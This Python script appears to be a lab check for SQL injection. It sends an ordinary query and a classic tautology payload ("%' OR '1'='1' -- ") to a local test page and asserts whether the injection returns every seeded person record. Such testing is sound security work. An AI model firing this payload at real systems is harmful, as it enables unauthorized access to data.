```python
import http.client
import re
import html
import sys
from urllib.parse import quote

HOST = "127.0.0.1"
PORT = 4280
PATH = "/lab_cases/S005/index.php"

def fetch(q):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    url = PATH + "?q=" + quote(q, safe="")
    conn.request("GET", url)
    resp = conn.getresponse()
    status = resp.status
    body = resp.read().decode("utf-8", "replace")
    conn.close()
    return status, body

def parse_records(body):
    records = set()
    pattern = r"<p>ID\s*(\d+)\s*：\s*([^<]*)</p>"
    for m in re.finditer(pattern, body):
        records.add((m.group(1), html.unescape(m.group(2)).strip()))
    return records

normal_q = "Alice"
test_q = "%' OR '1'='1' -- "

status_normal, body_normal = fetch(normal_q)
status_test, body_test = fetch(test_q)

print("普通请求 HTTP 状态:", status_normal)
print("测试请求 HTTP 状态:", status_test)

if status_normal != 200 or status_test != 200:
    print("无法判断：请求未正常返回 200，请检查本地服务、路径和连接文件。")
    sys.exit(2)

normal_records = parse_records(body_normal)
test_records = parse_records(body_test)

print("普通请求解析记录:", sorted(normal_records))
print("测试请求解析记录:", sorted(test_records))

expected_normal = {("1", "Alice")}
expected_test_at_least = {("1", "Alice"), ("2", "Bob"), ("3", "Carol")}

if normal_records != expected_normal:
    print("无法判断：普通请求记录不符合预期，请检查 lab_people 预置数据、数据库连接和页面输出。")
    sys.exit(2)

if expected_test_at_least.issubset(test_records) and test_records > normal_records:
    print("成功断言：测试请求返回了普通请求之外的受控业务记录，解析记录集合包含全部预置人员。")
    sys.exit(0)
else:
    print("未确认：测试请求未返回预期的受控记录差异，请检查 SQL 注释兼容性、数据库内容和错误日志。")
    sys.exit(1)
```
